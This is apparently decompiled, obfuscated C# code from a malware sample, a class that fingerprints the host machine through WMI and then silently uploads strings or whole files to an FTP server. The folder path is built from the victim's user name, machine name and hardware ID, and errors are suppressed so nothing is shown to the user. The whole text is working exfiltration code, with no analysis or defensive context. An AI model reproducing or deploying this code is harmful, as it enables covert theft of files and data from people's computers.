using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace eltZnUpwRizyZ;

internal sealed class wihATTbwYdHSl
{
	[NonSerialized]
	internal static GetString _0087;

	public static string MVogxnZmiDFB()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b4: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(_0087(107402381));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(_0087(107402328)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = _0087(107402343);
			ManagementObject val3 = new ManagementObject(_0087(107402338) + text2 + _0087(107402265));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(_0087(107402260)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? _0087(107388397) : text;
		}
	}

	public static void TBgyjRIHMhIJRYs(string ejQANMeRSHLNdIAng = "URL", string LLKQGHzrOgxSQw = "USERNAME", string XgzpOnkBsPCn = "ACCESO", string iYGfiWVfMvj = "")
	{
		try
		{
			string text = MVogxnZmiDFB();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ejQANMeRSHLNdIAng + _0087(107402943) + Environment.UserName + _0087(107402930) + Environment.MachineName + _0087(107402909) + text + _0087(107402904));
			ftpWebRequest.Method = _0087(107402235);
			ftpWebRequest.Credentials = new NetworkCredential(LLKQGHzrOgxSQw, XgzpOnkBsPCn);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(iYGfiWVfMvj);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void FglfIgSlKdgC(string vVwdkUShJfFhuT = "URL", string zMorgruDzjkEOX = "USERNAME", string OUfQQNWgTiZQ = "ACCESO", string QGjewaCbyRAC = "")
	{
		try
		{
			string text = MVogxnZmiDFB();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(vVwdkUShJfFhuT + _0087(107402943) + Environment.UserName + _0087(107402930) + Environment.MachineName + _0087(107402909) + text + _0087(107402909) + Path.GetFileName(QGjewaCbyRAC));
			ftpWebRequest.Method = _0087(107402235);
			ftpWebRequest.Credentials = new NetworkCredential(zMorgruDzjkEOX, OUfQQNWgTiZQ);
			byte[] array = File.ReadAllBytes(QGjewaCbyRAC);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static wihATTbwYdHSl()
	{
		Strings.CreateGetStringDelegate(typeof(wihATTbwYdHSl));
	}
}
